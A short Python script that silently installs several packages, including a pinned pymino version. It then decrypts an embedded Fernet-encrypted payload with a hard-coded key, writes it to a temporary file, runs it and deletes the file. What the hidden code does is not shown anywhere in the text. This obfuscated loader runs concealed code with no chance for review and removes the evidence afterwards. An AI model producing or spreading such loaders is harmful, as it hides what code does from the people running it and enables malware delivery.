# -*- coding: utf-8 -*-
# Self-decrypting Python script

import subprocess
import sys
import importlib.util
import base64
import tempfile
import os

def ensure_package(module, pip_name):
    if importlib.util.find_spec(module) is None:
        subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])

ensure_package("cryptography", "cryptography")
ensure_package("colorama", "colorama")
ensure_package("pymino", "pymino==1.3.4.7")

from cryptography.fernet import Fernet

key = b'xgBisQXmV8BBa0-JH4prn-ePX0kV6t-Q2M_egwm7DKA='
encrypted_code = b'gAAAAABoiQQpolUkGLEhMkMk2tkQSkCyQRpik9_G3Mj3ZR68UIIiSerix04veft-3Zh77dwvzCPcCAtZc_AWs3BsXg8rPOSJ8b5r6GMuVX4Otx3XKrGHVx4dwc1Yu3GdZA27UXq2LB_RgY7uHGi7SiKr3Q76dVoDWPfKHkuOFFsngU09-pdGgEV0TkV0rjG6kzdyOR3eZTocswTwzaAovilDB3WSeSJPygalRoDhAKh8pGm0lDuZjRpuULa6AykepJ1XEmEEMVZofxPzbHNYyEykOxkZEiOjeL7HmvHDPf1QGtvZ7CaIJXkW-nJ0mVyOG65tvbQpbdpplajLL3AMPYWSTxbmLiETODrG3U5N2uvjfNXl4Zoys1HyTFxW39QPG_ysAlsJpqbbdIBB0PWZSwExYN4SAC0YCtUC0mmQH1Vi4piGLQaa_xzZmyRIqv6Tg6wV027_NcRlpOmXbWTm6NhfZzvK9vkfihwT2x7_f0VIJSUM9CUD1W4C7wyJ-ru2UbqoiVhyJNZRXOyucQzgoQgPez8yj7B6hw=='

def decrypt_and_run():
    f = Fernet(key)
    code = f.decrypt(encrypted_code).decode()

    with tempfile.NamedTemporaryFile("w", delete=False, suffix=".py") as temp:
        temp.write(code)
        temp_path = temp.name

    subprocess.run([sys.executable, temp_path])
    os.remove(temp_path)

decrypt_and_run()
